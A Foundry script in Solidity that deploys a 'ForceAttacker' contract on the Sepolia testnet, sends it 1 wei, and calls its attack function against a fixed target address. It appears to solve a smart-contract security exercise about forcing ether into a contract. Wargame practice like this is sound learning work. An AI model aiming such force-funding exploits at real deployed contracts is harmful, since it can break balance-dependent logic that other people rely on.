// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {ForceAttacker} from "../src/ForceAttacker.sol";

contract ForceAttackerScript is Script {
    function run() external {
        address targetAddress = 0x23fb3DbD0F473Aa3678F9f95fD09112F0ef2fc2D;

        vm.startBroadcast(vm.envUint("SEPOLIA_PRIVATE_KEY"));

        ForceAttacker attacker = new ForceAttacker();

        payable(address(attacker)).transfer(1 wei);
        console.log("Attacker contract deployed and fund, ", address(attacker));

        attacker.attack(payable(targetAddress));
        console.log("Attack!");

        vm.stopBroadcast();

        console.log(
            "Now, the target contract balance = ",
            targetAddress.balance
        );
    }
}
